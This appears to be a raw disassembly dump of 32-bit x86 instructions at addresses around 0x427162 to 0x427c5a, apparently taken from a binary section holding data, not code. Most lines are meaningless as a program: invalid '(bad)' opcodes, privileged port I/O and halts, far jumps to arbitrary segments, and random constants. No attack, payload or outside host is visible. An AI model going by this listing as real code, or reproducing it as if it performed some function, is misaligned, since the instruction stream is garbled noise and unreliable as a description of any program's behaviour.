  427162:	mov    ds:0xf46fd2b0,eax
  427167:	nop
  427168:	daa    
  427169:	or     eax,0xe7c13a84
  42716e:	push   es
  42716f:	aas    
  427170:	mov    dl,0xe
  427172:	jp     0x42713e
  427174:	inc    esi
  427175:	adc    al,dl
  427177:	mov    edx,0x61a63e08
  42717c:	xor    edi,DWORD PTR [ebp+0x79]
  42717f:	add    al,0x4c
  427181:	stos   DWORD PTR es:[edi],eax
  427182:	arpl   dx,si
  427184:	pusha  
  427185:	ins    BYTE PTR es:[edi],dx
  427186:	nop
  427187:	push   esi
  427188:	jp     0x42717a
  42718a:	or     eax,0x8cffe68c
  42718f:	jmp    DWORD PTR [edx+edx*4-0x74]
  427193:	(bad)  [ecx+0x2b292b3c]
  427199:	(bad)  [ecx+0x291216a8]
  42719f:	jnp    0x427164
  4271a1:	mov    bl,0xd
  4271a3:	jle    0x4271bc
  4271a5:	(bad)  
  4271a6:	lods   al,BYTE PTR ds:[esi]
  4271a7:	arpl   WORD PTR [ebx],si
  4271a9:	sub    ah,al
  4271ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4271ac:	sub    BYTE PTR [esi],bl
  4271ae:	iret   
  4271af:	repz lea ebx,[esi+0x7d]
  4271b3:	fmulp  st(1),st
  4271b5:	xor    eax,0x5ed81199
  4271ba:	inc    ecx
  4271bb:	dec    edi
  4271bc:	dec    edx
  4271bd:	mov    ds:0x20ada86b,al
  4271c2:	je     0x4271ec
  4271c4:	popf   
  4271c5:	out    dx,eax
  4271c6:	rcl    BYTE PTR [esi+0x3f],1
  4271c9:	pop    edx
  4271ca:	xchg   ebp,eax
  4271cb:	push   0x21be4194
  4271d0:	mov    ds:0xc3aedf0e,eax
  4271d5:	(bad)  
  4271d7:	rol    BYTE PTR ds:0x565e2748,1
  4271dd:	and    esi,ebx
  4271df:	jno    0x4271e0
  4271e1:	(bad)  
  4271e2:	shl    dh,1
  4271e4:	jge    0x4271cb
  4271e6:	enter  0x88ff,0x13
  4271ea:	fistp  WORD PTR [eax-0x42686eb7]
  4271f0:	adc    bl,BYTE PTR [ecx]
  4271f2:	mov    ch,0x61
  4271f4:	shl    BYTE PTR [edi-0x58],1
  4271f7:	dec    DWORD PTR [edi-0x35]
  4271fa:	rcl    DWORD PTR [ebx-0x7d2d22f6],cl
  427200:	clc    
  427201:	adc    edx,DWORD PTR [edi+0xe67ab89]
  427207:	ror    DWORD PTR [ecx-0x527cd8cc],cl
  42720d:	mov    bl,dh
  42720f:	jmp    0x4665:0x782316f9
  427216:	retf   
  427217:	retf   0x95a3
  42721a:	rcr    bl,1
  42721c:	and    eax,0x3c9bb30e
  427221:	jg     0x427261
  427223:	(bad)  
  427225:	mov    edx,0xb2a1f16e
  42722a:	ficom  WORD PTR [esi-0x4823ca49]
  427230:	xlat   BYTE PTR ds:[ebx]
  427231:	and    DWORD PTR [eax-0x522ed82e],eax
  427237:	popa   
  427238:	lods   eax,DWORD PTR ds:[esi]
  427239:	fwait
  42723a:	cmp    eax,0x3464ee8d
  42723f:	outs   dx,BYTE PTR ds:[esi]
  427240:	test   DWORD PTR [eax],0x0
	...
  4272b2:	add    BYTE PTR [eax],al
  4272b4:	push   esp
  4272b5:	and    eax,0xeefd4e8d
  4272ba:	xlat   BYTE PTR ds:[ebx]
  4272bb:	aas    
  4272bc:	jle    0x427280
  4272be:	ds jmp 0x19b4147b
  4272c4:	sub    esp,DWORD PTR [eax+0xf50001]
  4272ca:	add    BYTE PTR [eax],al
  4272cc:	xor    BYTE PTR [edx+0x4b],0x58
  4272d0:	xchg   esi,eax
  4272d1:	dec    edx
  4272d2:	aaa    
  4272d3:	and    DWORD PTR [eax+0x7ea70a28],esp
  4272d9:	fwait
  4272da:	imul   ecx,DWORD PTR [ebp+0x67],0xffffff84
  4272de:	inc    ebx
  4272df:	or     DWORD PTR [esi-0x30],ebx
  4272e2:	inc    ecx
  4272e3:	fild   WORD PTR [esp+eax*1+0x16]
  4272e7:	sub    al,0x2a
  4272e9:	in     al,0xcb
  4272eb:	scas   al,BYTE PTR es:[edi]
  4272ec:	enter  0x8f54,0xab
  4272f0:	imul   edi,eax,0x52
  4272f3:	cmp    eax,0x9d6c1834
  4272f8:	or     DWORD PTR [ebp+0x3592b4dc],esp
  4272fe:	hlt    
  4272ff:	gs test al,0x9b
  427302:	mov    bl,bh
  427304:	pop    ebp
  427305:	out    0x69,eax
  427307:	(bad)  
  427308:	push   eax
  427309:	ins    BYTE PTR es:[edi],dx
  42730a:	dec    eax
  42730b:	cwde   
  42730c:	sahf   
  42730d:	jne    0x4272ad
  42730f:	call   0xdc6abedc
  427314:	mov    al,0xd6
  427316:	jp     0x42732d
  427318:	jae    0x42730e
  42731a:	fwait
  42731b:	xor    ebx,DWORD PTR [esi]
  42731d:	cwde   
  42731e:	push   ds
  42731f:	push   eax
  427320:	popa   
  427321:	xchg   ebp,eax
  427322:	dec    ebp
  427323:	push   ebp
  427324:	mov    esi,0x3e7919a3
  427329:	fldcw  WORD PTR [esp+ecx*1+0x3b840e2f]
  427330:	push   esp
  427331:	cli    
  427332:	xchg   ebx,eax
  427333:	mov    edx,0xf8141d69
  427338:	enter  0xb901,0x8d
  42733c:	js     0x427302
  42733e:	jg     0x4272e4
  427340:	ss jl  0x4272db
  427343:	mov    BYTE PTR [ecx+0x16915d41],bh
  427349:	xor    al,0xe4
  42734b:	sub    BYTE PTR [ebp+ecx*2-0x7f],dh
  42734f:	dec    esi
  427350:	iret   
  427351:	mov    eax,0x62d08416
  427356:	jmp    0x42732f
  427358:	jne    0x427356
  42735a:	add    ecx,DWORD PTR [ebp+0x866aa39]
  427360:	mov    al,ds:0xd34cccd1
  427365:	sub    BYTE PTR [edx+0x129ea49f],bh
  42736b:	mov    ds:0x454ff7e0,al
  427370:	jae    0x42733f
  427372:	test   al,0x30
  427374:	or     edi,DWORD PTR [esi+0x7b46b361]
  42737a:	mov    ch,0x48
  42737c:	dec    edi
  42737d:	ret    0x53ac
  427380:	inc    edi
  427381:	inc    edx
  427382:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427383:	jae    0x427331
  427385:	xlat   BYTE PTR ds:[ebx]
  427386:	pop    ecx
  427387:	outs   dx,DWORD PTR ds:[esi]
  427388:	add    al,0x2a
  42738a:	test   BYTE PTR [eax-0x71],dh
  42738d:	push   esp
  42738e:	out    0x70,al
  427390:	push   edx
  427391:	sbb    edx,DWORD PTR [eax-0x33]
  427394:	arpl   WORD PTR [edx-0x4e],ax
  427397:	sbb    esp,DWORD PTR [esi+0x12]
  42739a:	and    ebp,DWORD PTR [edi]
  42739c:	jo     0x427392
  42739e:	sbb    BYTE PTR [esp+edi*1+0x15d33513],al
  4273a5:	inc    esi
  4273a6:	push   ebp
  4273a7:	xchg   DWORD PTR ds:0x6052d0f,ecx
  4273ad:	jae    0x427391
  4273af:	adc    ebx,edi
  4273b1:	stos   BYTE PTR es:[edi],al
  4273b2:	fdivr  DWORD PTR [edx-0x5df0ccbf]
  4273b8:	push   0x4945b13f
  4273bd:	cmp    DWORD PTR [edi+eax*8+0xf],ebx
	...
  427431:	add    BYTE PTR [eax],al
  427433:	add    BYTE PTR [ecx+0x6f],ch
  427436:	mov    BYTE PTR [eax],cl
  427438:	mov    gs,edi
  42743a:	jmp    0xe38703ae
  42743f:	jmp    0xa120:0xd71a3482
  427446:	add    DWORD PTR [eax],eax
  427448:	cmc    
  427449:	add    BYTE PTR [eax],al
  42744b:	add    BYTE PTR ds:0x94bc8ce0,bh
  427451:	inc    eax
  427452:	fistp  WORD PTR [edx-0x6b]
  427455:	sub    ch,dl
  427457:	lock add BYTE PTR [ecx-0x1b],ah
  42745b:	jmp    0x427494
  42745d:	adc    BYTE PTR [ebp-0xbb9f179],bl
  427463:	mov    ah,0x1b
  427465:	in     eax,0x8d
  427467:	push   ecx
  427468:	int3   
  427469:	repz push edx
  42746b:	sbb    bl,BYTE PTR [eax-0x1b9fc05b]
  427471:	loopne 0x4273fb
  427473:	fwait
  427474:	jle    0x427426
  427476:	sar    bl,1
  427478:	sbb    al,0x9
  42747a:	pop    es
  42747b:	fs loop 0x4274f4
  42747e:	clc    
  42747f:	mov    eax,ds:0x1f6a0a5e
  427484:	jle    0x427429
  427486:	or     eax,0x40f57cff
  42748b:	push   0x55
  42748d:	add    BYTE PTR [edi-0x58e5cceb],bl
  427493:	jno    0x427477
  427495:	call   0x33ac:0x36bdbdd1
  42749c:	mov    ebp,0x79ff74d9
  4274a1:	inc    edi
  4274a2:	inc    edi
  4274a3:	pop    ebx
  4274a4:	hlt    
  4274a5:	sbb    al,BYTE PTR [ebx-0x5a]
  4274a8:	mov    al,0xc6
  4274aa:	fsubrp st(2),st
  4274ac:	sub    dl,BYTE PTR [ebx+0x32c07ac6]
  4274b2:	jbe    0x4274d0
  4274b4:	jle    0x42749a
  4274b6:	lahf   
  4274b7:	inc    ecx
  4274b8:	jmp    0x80c199da
  4274bd:	call   0x41832be
  4274c2:	pop    es
  4274c3:	cmp    BYTE PTR [ebx+0x42],0x29
  4274c7:	mov    esp,gs
  4274c9:	in     eax,dx
  4274ca:	ficom  DWORD PTR [ebp+0x0]
  4274cd:	mov    ecx,0xb297a7ea
  4274d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274d3:	es push es
  4274d5:	aam    0x74
  4274d7:	aam    0x28
  4274d9:	addr16 aad 0x1e
  4274dc:	popa   
  4274dd:	mov    bl,bh
  4274df:	mov    ds:0xe7994c67,al
  4274e4:	cmp    BYTE PTR [ecx-0x56ad418e],bh
  4274ea:	idiv   ah
  4274ec:	lock xchg BYTE PTR es:[ebx-0x62e06ecc],ah
  4274f4:	adc    al,0x4c
  4274f7:	jl     0x4274aa
  4274f9:	int    0xc8
  4274fb:	sbb    esp,DWORD PTR [eax]
  4274fd:	aam    0x26
  4274ff:	and    esi,DWORD PTR [edi+0x46]
  427502:	shl    BYTE PTR [ebx-0xae1f68d],1
  427508:	mov    al,ds:0xf4066739
  42750d:	in     eax,dx
  42750e:	push   esp
  42750f:	out    0x2f,eax
  427511:	jb     0x427541
  427513:	jmp    0x33226e10
  427518:	adc    eax,0xde58e825
  42751d:	pop    ds
  42751e:	ss jno 0x427545
  427521:	pop    edi
  427522:	push   es
  427523:	inc    ecx
  427524:	push   0xcc4a8775
  427529:	push   ds
  42752a:	shr    BYTE PTR [edi-0x76],0xd3
  42752e:	xchg   ebp,eax
  42752f:	and    eax,edi
  427531:	adc    DWORD PTR [ebx],edi
  427533:	mov    edx,ebp
  427535:	adc    eax,0x4f32051a
  42753a:	xchg   ebp,eax
  42753b:	shl    ah,cl
  42753d:	int3   
  42753e:	aam    0x89
  427540:	scas   eax,DWORD PTR es:[edi]
	...
  4275b1:	add    BYTE PTR [eax],al
  4275b3:	add    BYTE PTR [edx],dl
  4275b5:	retf   
  4275b6:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4275bc:	mov    ds:0x689a8b87,al
  4275c1:	retf   
  4275c2:	aas    
  4275c3:	xor    DWORD PTR ds:0xf50001a2,edx
  4275c9:	add    BYTE PTR [eax],al
  4275cb:	add    BYTE PTR [esi+0x74f54193],al
  4275d1:	popa   
  4275d2:	or     eax,0x7d356b0e
  4275d7:	mov    dl,0x53
  4275d9:	xchg   ebp,eax
  4275da:	cmp    esi,ebx
  4275dc:	cwde   
  4275dd:	sahf   
  4275de:	pop    ds
  4275df:	lahf   
  4275e0:	or     DWORD PTR [ebx+edx*8-0x2a98e6aa],ebp
  4275e7:	repz bound edi,QWORD PTR [ebx-0x1cf7e458]
  4275ee:	int3   
  4275ef:	cs add al,0x52
  4275f2:	dec    ecx
  4275f3:	mov    cl,0xbc
  4275f5:	xchg   edi,eax
  4275f6:	out    dx,al
  4275f7:	shl    BYTE PTR es:[ebp-0x72],cl
  4275fb:	loop   0x427613
  4275fd:	arpl   WORD PTR [ecx-0x1e],si
  427600:	pop    eax
  427601:	addr16 out 0xd,eax
  427604:	add    eax,DWORD PTR [edx]
  427606:	cmp    BYTE PTR [edi-0x2d],bh
  427609:	dec    esi
  42760a:	xchg   DWORD PTR [ebp-0xb44cbcc],ecx
  427610:	jo     0x42767f
  427612:	icebp  
  427613:	stos   BYTE PTR es:[edi],al
  427614:	mov    bl,0x8d
  427616:	push   ebp
  427617:	and    eax,0xd3eee1ce
  42761c:	xchg   esp,eax
  42761d:	test   eax,0xfa3eab5a
  427622:	sbb    bh,ch
  427624:	int    0xc0
  427626:	add    bh,BYTE PTR [eax+0x64]
  427629:	lods   eax,DWORD PTR ds:[esi]
  42762a:	es mov esp,0x1ffc7b5d
  427630:	dec    ebp
  427631:	aam    0x6c
  427633:	add    BYTE PTR [eax+0x23],al
  427636:	push   eax
  427637:	dec    edx
  427638:	add    BYTE PTR [ebx],dh
  42763a:	jnp    0x42767c
  42763c:	xchg   ebp,eax
  42763d:	stc    
  42763e:	or     al,0x6
  427640:	test   BYTE PTR [edx+0x69],0x29
  427644:	stos   DWORD PTR es:[edi],eax
  427645:	and    dh,BYTE PTR [esi]
  427647:	xchg   ebp,eax
  427648:	jno    0x427648
  42764a:	add    eax,esi
  42764c:	and    al,0xdc
  42764e:	mov    ss,edx
  427650:	scas   al,BYTE PTR es:[edi]
  427651:	mov    eax,ds:0xd1b85124
  427656:	pop    ebp
  427657:	pop    ebx
  427658:	gs std 
  42765a:	mov    al,ds:0x44ee502c
  42765f:	push   esi
  427660:	pop    eax
  427661:	or     bl,0x75
  427664:	mov    ah,0x9e
  427666:	mov    bh,BYTE PTR [eax+0x4c963a1d]
  42766c:	dec    esi
  42766d:	sbb    al,0x89
  42766f:	mov    eax,ds:0xf1ac2346
  427674:	cwde   
  427675:	push   0xffffff92
  427677:	xchg   di,ax
  427679:	mov    ds:0x9b306a32,eax
  42767e:	mov    ds:0xde7cb662,eax
  427683:	ret    
  427684:	cmc    
  427685:	adc    ch,BYTE PTR [eax+0x68]
  427688:	test   al,0xe3
  42768a:	data16 jecxz 0x4276b3
  42768d:	jg     0x427704
  42768f:	add    BYTE PTR [edx-0x6825bf23],bh
  427695:	fnstcw WORD PTR [ecx-0x70be954e]
  42769b:	xlat   BYTE PTR ds:[ebx]
  42769c:	push   edi
  42769d:	mov    al,ds:0xdefe0726
  4276a2:	aaa    
  4276a3:	or     eax,0x16889359
  4276a8:	shr    edi,0xae
  4276ab:	popa   
  4276ac:	and    edx,DWORD PTR [ebx]
  4276ae:	sub    al,0xc0
  4276b0:	mov    dh,0x74
  4276b2:	stos   DWORD PTR es:[edi],eax
  4276b3:	retf   0x6917
  4276b6:	push   0x2ee7dc8b
  4276bb:	addr16 push ds
  4276bd:	push   edx
  4276be:	mov    ds:0x9cb4,al
	...
  427733:	add    BYTE PTR [eax-0xd53173],bh
  427739:	imul   edi,esp,0xffffff9f
  42773c:	and    al,0x37
  42773e:	or     al,0x49
  427740:	stos   DWORD PTR es:[edi],eax
  427741:	cld    
  427742:	cmp    BYTE PTR [edx+0xa],dl
  427745:	mov    ds:0xf50001,eax
  42774a:	add    BYTE PTR [eax],al
  42774c:	shr    BYTE PTR [edx+edi*2],1
  42774f:	clc    
  427750:	data16 sar bh,1
  427753:	adc    eax,DWORD PTR [edi-0x381ea254]
  427759:	scas   eax,DWORD PTR es:[edi]
  42775a:	push   ss
  42775b:	leave  
  42775c:	jne    0x4277c6
  42775e:	sub    BYTE PTR [ebp-0x7540ffe4],ch
  427764:	cmp    DWORD PTR [edi],esp
  427766:	in     eax,0x33
  427768:	inc    ebx
  427769:	test   ah,bh
  42776b:	std    
  42776c:	outs   dx,DWORD PTR ds:[esi]
  42776d:	in     al,dx
  42776e:	adc    BYTE PTR [edi],dh
  427770:	dec    eax
  427771:	call   DWORD PTR [ebx+0x62418bd2]
  427777:	mov    ebp,0xd968cbc4
  42777c:	sub    eax,0x5b0f1e06
  427781:	aas    
  427782:	ret    0xa1c1
  427785:	addr16 push esi
  427787:	inc    esi
  427788:	adc    eax,ebp
  42778a:	ins    DWORD PTR es:[edi],dx
  42778b:	jae    0x42773b
  42778d:	int3   
  42778e:	xor    al,0x49
  427790:	nop
  427791:	ins    BYTE PTR es:[edi],dx
  427792:	into   
  427793:	mov    WORD PTR [edi+0x7345291b],ds
  427799:	jmp    0x427808
  42779b:	retf   0xac92
  42779e:	mov    bl,0xad
  4277a0:	arpl   WORD PTR [eax-0x101a941e],dx
  4277a6:	pop    esi
  4277a7:	push   ebp
  4277a8:	inc    ebx
  4277a9:	jge    0x427764
  4277ab:	pop    esi
  4277ac:	mov    dh,0x8f
  4277ae:	jns    0x427765
  4277b0:	jnp    0x427813
  4277b2:	(bad)  
  4277b3:	out    dx,al
  4277b4:	fisubr DWORD PTR [ecx-0x6fae35fe]
  4277ba:	cli    
  4277bb:	pop    ebx
  4277bc:	ud1    esp,DWORD PTR [ebp+edx*4+0x2d]
  4277c1:	mov    bh,0xfa
  4277c3:	pop    edi
  4277c4:	mov    bh,0x26
  4277c6:	adc    al,bh
  4277c8:	mov    bh,0xb0
  4277ca:	xchg   esp,eax
  4277cb:	add    DWORD PTR [ecx+eiz*4+0x5071bba3],edx
  4277d2:	pop    ebp
  4277d3:	pop    ebx
  4277d4:	xchg   ebp,eax
  4277d5:	inc    edx
  4277d6:	in     al,dx
  4277d7:	or     DWORD PTR [ecx-0x54],esi
  4277da:	cld    
  4277db:	dec    ebp
  4277dc:	icebp  
  4277dd:	data16 int 0x3f
  4277e0:	cli    
  4277e1:	clc    
  4277e2:	jge    0x4277f6
  4277e4:	lods   al,BYTE PTR ds:[esi]
  4277e5:	fcmovb st,st(7)
  4277e7:	rcl    DWORD PTR [eax-0x38],0x73
  4277eb:	push   0x6e
  4277ed:	stos   BYTE PTR es:[edi],al
  4277ee:	and    al,0x38
  4277f0:	pop    edi
  4277f1:	test   al,0xe2
  4277f3:	xchg   DWORD PTR [ebx-0x13],ebx
  4277f6:	lds    esi,FWORD PTR [edi-0x55ca1507]
  4277fc:	cdq    
  4277fd:	out    0x4b,al
  4277ff:	or     DWORD PTR [edi+0x443ed3d2],0xffffffc2
  427806:	rol    DWORD PTR [eax+ecx*8-0x30],1
  42780a:	hlt    
  42780b:	stos   DWORD PTR es:[edi],eax
  42780c:	push   ds
  42780d:	(bad)  
  42780e:	cmp    ecx,ebp
  427810:	lods   eax,DWORD PTR ds:[esi]
  427811:	imul   edi,DWORD PTR [eax],0xffffffb3
  427814:	and    DWORD PTR [edx+0x73fe3231],esi
  42781a:	cmp    al,0x2f
  42781c:	xor    eax,DWORD PTR [edx]
  42781e:	add    BYTE PTR ds:0x8958703c,al
  427824:	jecxz  0x427850
  427826:	and    DWORD PTR [ebp+0x18],eax
  427829:	mov    ebp,0x9078a5ec
  42782e:	adc    BYTE PTR [eax-0x719ce621],al
  427834:	jp     0x42786c
  427836:	mov    bl,0x45
  427838:	mov    dh,0x58
  42783a:	sbb    DWORD PTR gs:[esi],0x70f20d1e
	...
  4278b1:	add    BYTE PTR [eax],al
  4278b3:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4278ba:	mov    edi,?
  4278bc:	dec    eax
  4278bd:	mov    ds:0x257f918f,al
  4278c2:	in     eax,0x69
  4278c4:	jmp    DWORD PTR [ebx+0xf50001]
  4278ca:	add    BYTE PTR [eax],al
  4278cc:	je     0x427914
  4278ce:	dec    ebx
  4278cf:	lods   al,BYTE PTR ss:[esi]
  4278d1:	fdivr  QWORD PTR ds:0x8a9a89e1
  4278d7:	mov    esi,0x94c504d0
  4278dc:	mov    esi,0x44a9ccc5
  4278e1:	sub    DWORD PTR [edi-0x5c3dd593],ebp
  4278e7:	daa    
  4278e8:	pop    ebx
  4278e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4278ea:	imul   edx,DWORD PTR [edi+ebx*8+0x594575e6],0xffffffd4
  4278f2:	js     0x427963
  4278f4:	cmc    
  4278f5:	push   ds
  4278f6:	add    esp,DWORD PTR [esi+0x5164da8d]
  4278fc:	ins    BYTE PTR es:[edi],dx
  4278fd:	inc    ebx
  4278fe:	cmp    eax,0x7476cc9d
  427903:	shl    DWORD PTR [esi+0x4eb47e2f],cl
  427909:	cdq    
  42790a:	mov    al,0x8
  42790c:	stos   DWORD PTR es:[edi],eax
  42790d:	xchg   BYTE PTR [ebx-0x69],cl
  427910:	ret    
  427911:	pop    ss
  427912:	into   
  427913:	add    esp,ebx
  427915:	dec    BYTE PTR [edx]
  427917:	outs   dx,BYTE PTR ds:[esi]
  427918:	cmp    cl,BYTE PTR [edi-0x58]
  42791b:	push   ds
  42791c:	scas   eax,DWORD PTR es:[edi]
  42791d:	je     0x42794a
  42791f:	xchg   esp,eax
  427920:	fisubr WORD PTR es:[eax+ecx*4-0x436b42ec]
  427928:	aad    0x6d
  42792a:	stos   BYTE PTR es:[edi],al
  42792b:	inc    ebx
  42792c:	push   edx
  42792d:	bnd jne 0x4278b8
  427930:	jnp    0x4278cf
  427932:	enter  0x74e8,0x91
  427936:	scas   eax,DWORD PTR es:[edi]
  427937:	out    0xb1,al
  427939:	mov    DWORD PTR [ebp-0x29],edx
  42793c:	xchg   DWORD PTR [edi],ebp
  42793e:	xlat   BYTE PTR ds:[ebx]
  42793f:	pop    edi
  427940:	xlat   BYTE PTR ds:[ebx]
  427941:	sar    BYTE PTR [eax+0x14c8ff5b],1
  427947:	data16 jne 0x42795b
  42794a:	push   ebp
  42794b:	sbb    dh,BYTE PTR [esi]
  42794d:	fdiv   DWORD PTR [ecx+0x5fdf30e2]
  427953:	adc    eax,0x51b1a08c
  427958:	pop    ds
  427959:	xchg   ebx,eax
  42795a:	call   0x9bdf:0xb5d189cf
  427961:	cli    
  427962:	pop    DWORD PTR [eax-0x17]
  427965:	inc    ebp
  427966:	sub    al,0x38
  427968:	dec    edx
  427969:	int3   
  42796a:	pop    ebp
  42796b:	mov    BYTE PTR [edx],dh
  42796d:	leave  
  42796e:	mov    edi,DWORD PTR [ebx-0x481d7da]
  427974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427975:	inc    ebx
  427976:	call   0x7110cba
  42797b:	mov    eax,0x6f3c06f
  427980:	dec    edi
  427981:	sti    
  427982:	xor    esi,DWORD PTR [edi-0x494dc8f]
  427988:	jo     0x4279af
  42798a:	arpl   WORD PTR [esi-0x5ae08963],ax
  427990:	cmp    al,cl
  427992:	cli    
  427993:	bound  ecx,QWORD PTR [esi-0x55e4d82f]
  427999:	jo     0x4279cf
  42799b:	sbb    dl,BYTE PTR ds:0xac935fa5
  4279a1:	jp     0x42798b
  4279a3:	mov    esp,0xe371bf29
  4279a9:	icebp  
  4279aa:	pop    eax
  4279ab:	or     esi,DWORD PTR gs:[esp+edi*1]
  4279af:	inc    eax
  4279b0:	loopne 0x427a08
  4279b2:	mov    cl,0x6e
  4279b4:	scas   eax,DWORD PTR es:[edi]
  4279b5:	daa    
  4279b6:	sti    
  4279b7:	ja     0x42794d
  4279b9:	and    DWORD PTR [edi-0x7d4cc460],ebx
  4279bf:	sub    BYTE PTR [esi],ah
	...
  427a31:	add    BYTE PTR [eax],al
  427a33:	add    BYTE PTR [ecx-0x42a9f2d8],bl
  427a39:	ja     0x427a16
  427a3b:	out    dx,eax
  427a3c:	das    
  427a3d:	mov    ch,0xeb
  427a3f:	aam    0xe3
  427a41:	retf   
  427a42:	push   ebp
  427a43:	mov    eax,0x1a4f4
  427a48:	cmc    
  427a49:	add    BYTE PTR [eax],al
  427a4b:	add    BYTE PTR [ebx],bl
  427a4d:	leave  
  427a4e:	xor    esi,DWORD PTR [esi+0x1265be52]
  427a54:	add    DWORD PTR [edi-0x2ea515ff],esp
  427a5a:	in     eax,0xee
  427a5c:	mov    ds:0xad437df6,al
  427a61:	xchg   BYTE PTR [edx],al
  427a63:	add    ebx,DWORD PTR [edi+esi*1]
  427a66:	bound  esi,QWORD PTR [ebx+0x1d]
  427a69:	jnp    0x427a82
  427a6b:	ret    
  427a6c:	inc    ecx
  427a6d:	stos   BYTE PTR es:[edi],al
  427a6e:	aad    0x58
  427a70:	pop    ds
  427a71:	cmp    al,0x55
  427a73:	inc    ebx
  427a74:	xchg   ecx,eax
  427a75:	repz push 0x3e
  427a78:	lods   al,BYTE PTR ds:[esi]
  427a79:	push   ebx
  427a7a:	dec    ebp
  427a7b:	add    al,BYTE PTR [ebp+0x46]
  427a7e:	fs (bad) 
  427a80:	ja     0x427a3a
  427a82:	xchg   esp,eax
  427a83:	mov    edx,0xf4a1ddf3
  427a88:	or     DWORD PTR [edx+ecx*1+0x7c],0xffffffc4
  427a8d:	mov    ebp,0x437dd9a
  427a92:	mov    edx,0xfc721b7
  427a97:	pop    ss
  427a98:	push   0x59ac4c83
  427a9d:	data16 xor al,ch
  427aa0:	rcl    BYTE PTR [edx+0x69458ffa],cl
  427aa6:	mov    esi,esp
  427aa8:	add    BYTE PTR [eax+0x645d2a3e],al
  427aae:	xchg   DWORD PTR [edi-0x57],ebx
  427ab1:	js     0x427a4e
  427ab3:	cmp    bh,0x80
  427ab6:	pop    ebp
  427ab7:	push   es
  427ab8:	push   cs
  427ab9:	clc    
  427aba:	dec    esp
  427abb:	push   ss
  427abc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427abd:	sub    dl,bl
  427abf:	mov    edi,0x74af5f0b
  427ac4:	call   0x88e1:0x99f98610
  427acb:	adc    ah,al
  427acd:	aas    
  427ace:	adc    BYTE PTR [ebx],cl
  427ad0:	mov    al,0x6
  427ad2:	fild   DWORD PTR [eax+0x36f6fc47]
  427ad8:	fst    QWORD PTR [edi+eiz*8]
  427adb:	xlat   BYTE PTR ds:[ebx]
  427adc:	sbb    eax,0xe74c0e2d
  427ae1:	mov    ah,0x35
  427ae3:	push   eax
  427ae4:	enter  0x9b51,0x7f
  427ae8:	jecxz  0x427ae6
  427aea:	adc    cl,BYTE PTR [ebp-0x44]
  427aed:	xor    DWORD PTR [eax],esp
  427aef:	scas   al,BYTE PTR es:[edi]
  427af0:	sbb    eax,esi
  427af2:	(bad)  
  427af3:	cdq    
  427af4:	fwait
  427af5:	cmp    eax,0xa5f4c655
  427afa:	loop   0x427aeb
  427afc:	pop    esi
  427afd:	call   0xf854f3a7
  427b02:	jle    0x427b0a
  427b04:	stos   BYTE PTR es:[edi],al
  427b05:	sbb    DWORD PTR [esi-0x74],esp
  427b08:	hlt    
  427b09:	aas    
  427b0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b0b:	push   eax
  427b0c:	mov    DWORD PTR [esi+0x7287c0c9],esi
  427b12:	fistp  WORD PTR [edi+0x4f45816e]
  427b18:	mov    edx,0x89c49b43
  427b1d:	aaa    
  427b1e:	mov    edx,0xf96bfd4
  427b23:	sub    eax,0x5774445
  427b28:	xchg   ebx,eax
  427b29:	call   0xde953738
  427b2e:	cdq    
  427b2f:	fld    DWORD PTR [ebp+0xf]
  427b32:	sub    ah,cl
  427b34:	dec    ebx
  427b35:	(bad)  
  427b39:	sub    BYTE PTR [edi],ah
  427b3b:	pop    esp
  427b3c:	(bad)  
  427b3d:	cli    
  427b3e:	pop    esi
  427b3f:	adc    eax,0x2b
	...
  427bb4:	loop   0x427c16
  427bb6:	test   DWORD PTR [esi+0x74f3f787],esi
  427bbc:	mov    eax,0xfd14fe65
  427bc1:	jnp    0x427bdc
  427bc3:	push   eax
  427bc4:	jmp    0xf5427d6e
  427bc9:	add    BYTE PTR [eax],al
  427bcb:	add    BYTE PTR [ebx],bh
  427bcd:	push   edx
  427bce:	int3   
  427bcf:	sub    BYTE PTR [ecx-0x176f7dac],0xc1
  427bd6:	call   0xbc63e1ab
  427bdb:	retf   0xc8a9
  427bde:	sbb    eax,0x67bad573
  427be3:	pop    ebp
  427be4:	jnp    0x427bdb
  427be6:	pop    ebx
  427be7:	push   0x39
  427be9:	popf   
  427bea:	lock sti 
  427bec:	cmc    
  427bed:	mov    eax,0x6fe1ac09
  427bf2:	ins    DWORD PTR es:[edi],dx
  427bf3:	mov    dh,0xee
  427bf5:	int3   
  427bf6:	arpl   WORD PTR [edi],si
  427bf8:	js     0x427bec
  427bfa:	dec    ebp
  427bfb:	ja     0x427bb9
  427bfd:	xor    al,0x82
  427bff:	jno    0x427c55
  427c01:	hlt    
  427c02:	out    dx,al
  427c03:	shr    DWORD PTR [ebx+0x109e9aa],0x67
  427c0a:	test   BYTE PTR [esi+0x29],bl
  427c0d:	les    ebx,FWORD PTR [ecx-0x7dbb44d7]
  427c13:	ins    BYTE PTR es:[edi],dx
  427c14:	clc    
  427c15:	popa   
  427c16:	jo     0x427bde
  427c18:	das    
  427c19:	mov    ebp,0x4383ca19
  427c1e:	cwde   
  427c1f:	jae    0x427c9f
  427c21:	outs   dx,DWORD PTR ds:[esi]
  427c22:	push   edi
  427c23:	mov    eax,ds:0x4db45628
  427c28:	cli    
  427c29:	mov    ebp,esp
  427c2b:	sbb    al,0xdf
  427c2d:	add    ah,dl
  427c2f:	call   DWORD PTR [ebp+0x17]
  427c32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427c33:	sbb    DWORD PTR [edx],edi
  427c35:	into   
  427c36:	jmp    0x427bc7
  427c38:	or     edi,DWORD PTR [edi-0x47]
  427c3b:	push   ss
  427c3c:	mov    esi,ecx
  427c3e:	leavew 
  427c40:	call   0x3697:0x153434b3
  427c47:	xor    ebp,DWORD PTR [eax-0x2d]
  427c4a:	mov    ecx,0xb04ec3ba
  427c4f:	sbb    DWORD PTR [esi],edi
  427c51:	cli    
  427c52:	and    bl,bh
  427c54:	mov    edi,0x8bf8050c
  427c59:	int3   
  427c5a:	cmp    eax,0x13b7dca4
